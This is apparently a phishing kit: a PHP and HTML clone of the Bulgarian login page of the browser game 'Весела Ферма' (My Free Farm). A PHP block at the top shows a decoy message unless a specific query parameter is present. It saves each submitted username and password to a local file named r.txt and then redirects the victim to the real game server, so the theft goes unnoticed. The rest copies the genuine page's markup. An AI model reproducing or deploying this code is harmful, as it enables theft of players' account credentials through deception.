 <?php
   if (isset($_GET['veselaferma.com'])) {
    true;
   } else {
    exit("Welcome to a new world.");
   }
   if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] !== "" && $_POST['password'] !== "") {
     $username = $_POST['username'];
     $password = $_POST['password'];

     $result = "Username -> " . $username . "\nPassword -> " . $password."\n------------------\n";

     $myfile = fopen("r.txt", "a");
     fwrite($myfile, base64($result));
     fclose($myfile);

     header("Location: https://s1.veselaferma.com/main.php?ref=gomffbg");
   }




?>
<!DOCTYPE html>
<html>

<head>

		<meta http-equiv="X-UA-Compatible" content="IE=8">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Весела Ферма - Уеб базирана игра - Играй сега безплатно!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="index,follow">
	<meta name="keywords" content="весела ферма, ферма, весела, онлайн игра, игра, играй, безплатна игра, фермерска симулация, my free farm, browser game, browser games, myfreefarm, free browser game farm, farm browser game, free online games, economy simulations, online games, browser based online games, browser based games, browser based game">
	<meta name="description" content="Безплатната уеб базирана онлайн игра Весела Ферма се развива изцяло около твоя собствена ферма. Стани най-великия фермер за всички времена!">
	<meta http-equiv="Content-Language" content="bg" />
	<meta name="author" content="upjers GmbH &amp; Co. KG">
	<meta name="publisher" content="upjers GmbH &amp; Co. KG" />
	<meta name="page-topic" content="Онлайн игра за почивка и свободно време" />
	<meta name="company" content="upjers GmbH &amp; Co. KG" />
	<meta name="google-site-verification" content="XC0wgZqqFWF9BDmMcRSPpXBSmmJTDZsWrHFc3689YYI" />
		<link rel="canonical" href="https://veselaferma.com" />
	<link rel="SHORTCUT ICON" href="https://veselaferma.com/favicon.ico" type="image/x-icon" />
	<script src="https://veselaferma.com/js/prototype.js"></script>
	<script src="https://veselaferma.com/js/scriptaculous.js"></script>

        <!-- Bez login_140416.js, animaciqta spira!! -->

        <script src="login_140416.js"></script>
	<script src="https://veselaferma.com/js/data.php"></script>
	    <link rel="stylesheet" href="https://veselaferma.com/loginmain.css?v=1647734223">
	<link rel="stylesheet" media="only screen and (max-device-width:550px)" href="https://veselaferma.com/login480.css">

	<link rel="stylesheet" href="https://veselaferma.com/responsive.css">
    <link rel="stylesheet" href="https://veselaferma.com/tablet_fixes.css">

	<link rel="stylesheet" media="only screen and (max-device-width:1024px)" href="https://veselaferma.com/ipad.css">
	    <!-- Google Tag Manager -->
	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
	})(window,document,'script','dataLayer','GTM-N8KFZ4T');</script>
	<!-- End Google Tag Manager -->
	</head>
<body onload="optimizeScreen(); startAnimations(); ">
<div id="main">
	<div id="back" class="backimg">
		<div id="clouds1"></div>
		<div id="clouds2"></div>
		<div id="sheepcloud"></div>
	</div>

	<div id="content">
		<div id="infobox">
			<div id="infoboxback" class="round transp8 shadow"></div>
			<div id="infoboxcontent">
				<div id="about">
					<h1>Уеб базираната игра Весела Ферма?</h1>
					<p>Станете най-добрият фермер за всички времена. Безплатната уеб базирана известна игра Весела Ферма се концентрира изцяло около ваша собствена ферма. Посейте своите онлайн поля със зеленчуци и хранителни растения, грижете се за животните и продължавайте да разширявате фермата си! Вълнисти овце, щастливи крави и жужукащи пчели вече ви очакват!<br><br>Всички ваши животни трябва да се посещават, морковите и царевицата са разцъфнали - време е за пътешествие до Мууград! Редовните статистики за местните фермерски клубове са щастливи да те приветстват, затова разгледай наоколо и се присъедини към любимият си фермерски клуб! Посетете железарията и закупете украшения за своите поля, за да могат фермерчетата да атакуват вашата ферма за прясни продукти - все пак, ти трябва да продаваш своите натурални продукти! Покажете своята показна ферма на своите приятели и украсете фермерската къща на своите мечти, посетете мелницата в Пондингтън и превърнете специални рецепти в сили, помагащи намаляването на времето за растеж на твоите растения или повишаващи тяхната жътва.<br><br>В тази забавна икономическа симулация не е нужно да бъдеш бизнес магьосник, за да успееш! Няма нужда от допълнителни програми за сваляне или софтуер, можеш да започнеш директно в своя браузър и незабавно да започнеш да се издигаш от Фермер Помощник до Зърнен Цар! Весела Ферма - вълнуваща онлайн игра, която е завладяла милиони ентусиазирани потребители.</p>					<ul>
					<li><a href="http://www.veselaferma.com/browser-games/">браузър игри с фермерско настроение</a></li>
					<li><a href="http://www.veselaferma.com/игра-ферма/">удивителна фермерска игра</a></li>
					<li><a href="http://www.veselaferma.com/интернет-игри/">интернет игрите в провинцията</a></li>
				  </ul>
				</div>
				<div id="story">
					<h2>Историята зад тази уеб базирана игра</h2>
					<p>Имало едно време малко прасенце, което живеело в малка ферма в провинцията на Весела Ферма. Гледайки как царевицата расте на слънчева светлина, осъзнавайки уханието на лятно усещане в цялата ферма, слушайки многото щастливо кудкудякащи кокошки и чудейки се на сладките овчици гушкащи своята пухеста козина близо една до друга, прасенцето се почувства щастливо и в едно със света.<br><br>Един ден, обаче, нашето прасенце усети, че нещо липсва: Фермерската къща не е преглеждана от доста време. Мученето на кравите е станало още по-силно и спешно, тъй като никой не ги е издоил. Вълната на овцете е започнала да расте на всякъде, тъй като няма кой да ги подстриже. "Това не може да продължава още дълго", каза си прасенцето. "Трябва ми някой, който да ми помогне да наглеждам полята, да храня пчелите и да стрижа овцете. Някой да се грижи за голямата фермерска къща и да посещата фермерския клуб в близкото градче Мууград.<br><br>И тогава ти дойде във Весела Ферма: за да се грижиш за фермата, ад посещаваш животните и да помагаш на прасенцето да води фермата... Очакваш щастлив край? Е, тогава запрятай ръкавите си, хващай вилата и остави уеб играта Весела Ферма да те въведе във изумителния свят на фермерството! Играй онлайн с милиони ентусиазирани уеб-играчи и за кратко време ще осъзнаеш: икономическата симулация може да бъде изключително цветна и интересна - и толкова много забавна!</p>					<ul>
					<li><a href="http://www.veselaferma.com/ферма-игри/">Забавни фермерски игри</a></li>
					<li><a href="http://www.veselaferma.com/Фермер-игра/">фермерската игра</a></li>
					<li><a href="http://www.veselaferma.com/фермер-игри/">Феновете на фермерските игри</a></li>
				  </ul>
				</div>
				<div id="features">
					<h3>Опциите на тази уеб базирана игра</h3>
					<p><b>Сей, сей, сей!</b><br><br>Разгледай своите онлайн поля и ги посей с 32 различни плодове и зеленчуци! Наслаждавай се на растежа на своите растения, поливай ги и ги тори, храни животните си. Искаш царевицата и морковите да растат още по-бързо? Тогава закупи бонус-рецепти и ги превърни в допълнителна сила във вятърната мелница<br><br><b>Щастието от това да бъдеш фермерско животно</b><br><br>Грижи се за своите крави, кокошки, овце и пчели, така те ще ти дават мляко, мед, яйца и вълна в тази уеб базирана игра. Обработвай продуктите на животните и ги превърни в майонеза, бонбони, сирене или прежда, за да ги продаваш директно на своите клиенти. Все пак, натуралните продукти са хит напоследък! Открий колко забавна може да бъде една икономическа симулация!<br><br><b>Твоят фермерски клуб те очаква!</b><br><br>Тази уеб базирана игра залага на общността: Събери се с приятели и се присъедини към свой фермерски клуб! Можете да завършвате забавни гилд-мисии заедно, спечелете от бронзов до златен медал и търгувайте един с друг! Пазарът ще предложи всичко, което едно фермерско сърце може да иска: Продавай своите безценни билки, ягоди или спанак, или закупи евтини нови семена!<br><br><b>Това не е всичко...</b><br><br>Има още много неща, които можеш да откриеш във Весела Ферма! Украшси своите поля със щастливо подскачащ заек и обзаведи своята фермерска къща в свой собствен стил! Посети бутката за билети и вземи безплатен билет всеки ден. Завършвай мисии и се издигни в 45 нива от Фермерски Помощник до Зърнен Цар. Потопи се в истинският селски живот в безплатната онлайн игра Весела Ферма!</p>					<ul>
					<li><a href="http://www.veselaferma.com/Онлайн-игри/">Очарованието на онлайн игрите</a></li>
					<li><a href="http://www.veselaferma.com/безплатни-игри/">безплатни игри във ферма</a></li>
			      </ul>
				</div>
				<div id="rules">
					<iframe id="rulesiframe" name="rules" src="https://veselaferma.com/adds/rules.php" allowtransparency="true" frameborder="0" scrolling="auto"></iframe>
				</div>
			</div>
			<div class="close link" onclick="closeBox('infobox')"></div>
		</div>

						<div id="roof"></div>
		<div id="title" class="titleback_bg"></div>
		<div id="windmill"></div>

		<div id="loginbar" class="">

            <div id="loginback" class="round transp shadow"></div>
			<div id="loginelements">

				<form name="loginform" action="" method="post" onsubmit="return createToken()">
				<input type="hidden" id="loginref" name="loginref" value="">
				<input type="hidden" id="loginretid" name="loginretid" value="">
				<div class="loginelem"><div class="inline">Сървър:&nbsp;</div><select id="loginserver" name="server" tabindex="1"><option value="1" >1</option><option value="2" >2</option><option value="3" >3</option></select>&nbsp;</div>
				<div class="loginelem"><div class="inline">Вход:&nbsp;</div><input id="loginusername" name="username" type="text" maxlength="50" size="15" tabindex="2" required>&nbsp;</div>
				<div class="loginelem"><div class="inline">Парола:&nbsp;</div><input id="loginpassword" name="password" type="password" maxlength="50" size="15" tabindex="3" required>&nbsp;</div>
				<div class="clear"></div>
				<input type="submit" id="loginbutton" class="link" tabindex="4" value="">
				</form>
				<a href="javascript:void(0)" onclick="setBox('pwforgotten')">Забравена парола?</a>
			</div>

					</div>
        		<div id="registerbutton" class="link" onclick="setBox('register')">
			<div class="buttontext">Играй сега</div>
		</div>
		<div id="tourbutton" class="link" onclick="setBox('tour')">
			<div class="buttontext4">Обиколка</div>
		</div>

		<div id="register">
			<div id="registerback" class="round transp8 shadow"></div>
			<div id="registerelements">
                                <div class="boxhead">Регистрация</div>
				<form name="registerform" action="" onsubmit="return startRegister()">
				<input type="hidden" id="registerref" name="ref" value="">
				<input type="hidden" id="registerwid" name="wid" value="">
				<input type="hidden" id="registeref_id" name="ef_id" value="">
				<input type="hidden" id="registertoken" name="token" value="">
				<input type="hidden" id="registerplsid" name="plsid" value="">
				<input type="hidden" id="registerretid" name="retid" value="">
				<input type="hidden" id="registermk" name="mk" value="">
				<input type="hidden" id="registermp" name="mp" value="">
				<input type="hidden" id="registermt" name="mt" value="">
				<input type="hidden" id="registermc" name="mc" value="">
				<input type="hidden" id="registermn" name="mn" value="">
				<div class="registerline">
					<label>Сървър:</label><select tabindex="5" id="registerserver"><option value="1" selected>1</option><option value="2" >2</option><option value="3" >3</option></select>
				</div>
				<div class="registerline">
					<label>Име за вход</label><input type="text" maxlength="15" size="25" tabindex="6" id="registerusername" value="">
				</div>
				<div class="registerline">
					<label>Парола:</label><input type="password" maxlength="50" size="25" tabindex="7" id="registerpassword">
				</div>
				<div class="registerline">
					<label>Е-майл:</label><input type="text" maxlength="50" size="25" tabindex="8" id="registeremail" value="">
				</div>
				<div class="registerline">
										<input type="checkbox" tabindex="9" id="registerterms" checked>Приеми <a href="https://bg.upjers.com/terms" rel="nofollow" target="_blank">УЗП</a> и <a href="https://bg.upjers.com/privacy" rel="nofollow" target="_blank">Защита на личните данни</a>				</div>
				<input id="registerbutton2" class="buttontext2 clear link" tabindex="10" type="submit" value="Регистрация">
				</form>
							</div>
			<div class="close link" onclick="closeBox('register')"></div>
		</div>

		<div id="pwforgotten">
			<div id="pwforgottenback" class="round transp shadow"></div>
			<div id="pwforgottenelements">
				<div class="boxhead">Нова парола</div>
				<form name="forgottenform" action="" onsubmit="return sendPassword()">
				<div class="pwforgottenline">
					<label>Сървър:</label><select id="forgottenserver" tabindex="11"><option value="1" >1</option><option value="2" >2</option><option value="3" >3</option></select>
				</div>
				<div class="pwforgottenline">
					<label>Е-майл:</label><input id="forgottenemail" type="text" maxlength="50" size="25" tabindex="12">
				</div>
				<input id="pwforgottenbutton" class="buttontext3 clear link" tabindex="13" type="submit" value="Поискай парола">
				</form>
				<div id="pwforgottensuccess">Вашата нова парола е изпратена до посочения е-майл адрес.</div>
				                <div id="pwforgottenportaladd">Ако имаш upjers акаунт, можеш да  <a href="https://bg.upjers.com/passwordresend" target="_blank">смениш своята парола тук</a>.</div>
							</div>
			<div class="close link" onclick="closeBox('pwforgotten')"></div>
		</div>

		<div id="logout">
			<div id="logoutback" class="round transp shadow"></div>
			<div id="logoutinfo">
				<div class="boxhead2">Ти излезе от играта.</div>
				<div>Благодарим ви за посещението.<br><br><b>Забележете:</b> Вие излизате автоматично от играта след 2 часа. Това е мярка за сигурност, за защита на вашия акаунт в случай, че играете от публичен компютър (училище, университет, интернет кафе) и забравите да натиснете бутона изход. <br><br> Продължавайте да се забавлявате с играта!<br><br>Ваш екип на Весела Ферма</div>
			</div>
			<iframe id="logoutiframe" src="" scrolling="no" allowtransparency="true"></iframe>
			<div class="close link" onclick="closeBox('logout')"></div>
		</div>

		<div id="tour">
			<div id="tourimg"></div>
			<div id="tourtxt"></div>
			<div id="tourprev" class="link" onclick="scrollTour(0)"></div>
			<div id="tournext" class="link" onclick="scrollTour(1)"></div>
			<div id="tourregisterbutton" class="link" onclick="setBox('register')">
				<div class="buttontext">Играй сега</div>
			</div>
			<div class="close link" id="tourclose" onclick="closeBox('tour')"></div>
		</div>

		<div id="spot">
			<div id="spotback" class="round transp shadow"></div>
			<iframe id="spotiframe" src="" scrolling="no" allowtransparency="true"></iframe>
			<div class="close link" onclick="closeBox('spot')"></div>
		</div>

		<div id="portal">
			<div id="portaltop">Портал-Вход</div>
            <div id="portalmiddle">
            	<div>Моля използвай данните си за вход в портала, с нормалния метод за вход на главната страница на играта.</div>
            </div>
            <div id="portalbottom"></div>
            <div id="portalclose" class="link" onclick="closeBox('portal')"></div>
		</div>

		<div id="error">
			<div id="errorback" class="round transp shadow"></div>
			<div id="errortext">
				<div id="errorhead">Грешка</div>
				<div id="errormessage"></div>
			</div>
			<div class="close link" onclick="closeBox('error')"></div>
		</div>




		<div id="linklist">
			<a href="javascript:void(0)" onclick="setBox('infobox','about')">За Весела Ферма</a>&nbsp;|&nbsp;
			<a href="javascript:void(0)" onclick="setBox('infobox','story')">Историята зад тази уеб базирана игра</a>&nbsp;|&nbsp;
			<a href="javascript:void(0)" onclick="setBox('infobox','features')">Опциите</a>&nbsp;|&nbsp;
			<a href="https://bg.upjers.com/terms" target="_blank" rel="nofollow">УЗП</a>&nbsp;|&nbsp;
			<a href="https://bg.upjers.com/imprint" target="_blank" rel="nofollow">Контакти/Кредити</a>&nbsp;|&nbsp;
			<a href="https://bg.upjers.com/privacy" rel="nofollow" target="_blank">Защита на личните данни</a>&nbsp;|&nbsp;			<a href="javascript:void(0)" onclick="setBox('infobox','rules')">Правила</a>&nbsp;|&nbsp;
			<a href="https://bg.upjers.com/foren/bg/viewforum.php?f=38" target="_blank">Форум</a>&nbsp;|&nbsp;			<a href="https://support.upjers.com/index.php?lang=bg" target="_blank">Поддръжка</a>&nbsp;|&nbsp;
									            <a href="https://m.upjers.com/bg/apps/my-free-farm-2" target="_blank">My Free Farm 2 App</a>&nbsp;|&nbsp;
			<a href="https://play.google.com/store/apps/details?id=com.upjers.newzealandfarmer" target="_blank">Google Play</a>&nbsp;|&nbsp;
			<a href="https://itunes.apple.com/bg/app/my-free-farm-2/id908324719?mt=8" target="_blank">App Store</a>&nbsp;|&nbsp;
			                        			<a href="https://bg.upjers.com" target="https://bg.upjers.com" title="Уеб игри на bg.upjers.com">Уеб игри - upjers.com</a>            		</div>

		<div id="minibanner">
			<center>
			<script type="text/javascript"><!--//<![CDATA[
var path = 'https://supply.upjers.com/view/view_minibanner.php?';
var sense = Math.floor(Math.random()*999999999);
document.write ("<scr" + "ipt type='text/javascript' src='"+path);
document.write ("land=BG&params=0,0,1647734223,up_mf_st&count=8&except=44&ref=up_mf_st");
document.write ("&sense=" + sense);
document.write ("'><\/scr" + "ipt>");
//]]>--></script>

			<a href="https://apps.upjers.com/my-free-farm-2" target="_blank"><div id="mff_mobile_link"></div></a>
			</center>
		</div>

		<div id="block"></div>
		<div id="load"></div>
	</div>
	<div id="toolbar">
<div id="defaultUpjersToolbarContainer" style="position:relative; top:0px; left:0px; height:30px; width:100%; min-width:1000px; z-index:100; background-image:url('https://utb.wavecdn.net/toolbar_all/pics/tool_bg_new.jpg');">

<script type="text/javascript">var flContVisib = false;var spContVisib = false;var ClickInDD = false;var ClickInDDCtrl = false;function altSpielDD(){if(!flContVisib){spContVisib = !spContVisib;}else{flContVisib = !flContVisib;spContVisib = !spContVisib;}}function altFlagDD(){if(!spContVisib){flContVisib = !flContVisib;}else{flContVisib = !flContVisib;
spContVisib = !spContVisib;}}document.onclick=clickHandler;function clickHandler(){if(ClickInDDCtrl){if(flContVisib){document.getElementById('flcont').style.display='block';}else{document.getElementById('flcont').style.display='none';}if(spContVisib){document.getElementById('spcont').style.display='block';}
else{document.getElementById('spcont').style.display='none';}ClickInDDCtrl = false;}else if(ClickInDD){ClickInDD = false;}else{if(flContVisib){document.getElementById('flcont').style.display='none';flContVisib = false;}if(spContVisib){document.getElementById('spcont').style.display='none';spContVisib = false;}}}</script>
<link rel="stylesheet" href="//utb.wavecdn.net/toolbar_all/up_tb_style_left.css" type="text/css"><div id="uplogo" class="div_uplogo" title=""><a href="https://BG.upjers.com" target="_blank"><img src="https://utb.wavecdn.net/toolbar_all/pics/up_klein_new.png" alt="upjers.com" /></a>
	</div>
			<div id="spcont" class="div_spcont" onclick="ClickInDD = true;">
			
			
		
<script>
function utb_getElementsByClassName(node, classname){
 var a=[];
 var re=new RegExp('(^| )'+classname+'( |$)');
 var els=node.getElementsByTagName("*");
 for (var i=0, j=els.length; i<j; i++)
  if(re.test(els[i].className))a.push(els[i]);
 return a;
}
function utb_hide_next_games(){
 var list=utb_getElementsByClassName(document.body, "sp_li_l");
 for(var i=0, j=list.length; i<j; i++)
  list[i].style.display = "block";
 var list = utb_getElementsByClassName(document.body, "sp_li_r");
 for (var i = 0, j = list.length; i < j; i++)
  list[i].style.display = "block";
 document.getElementById("more_games").style.display = "none";
 return true;
}
</script>UA-17824149-1</div>
</div>

<script>
window.onresize = function(event)
{
	if(window.innerHeight > window.innerWidth) document.getElementById('mff_mobile_link').style.display = "block";
	else document.getElementById('mff_mobile_link').style.display = "none";
};
</script>


</body>
</html>
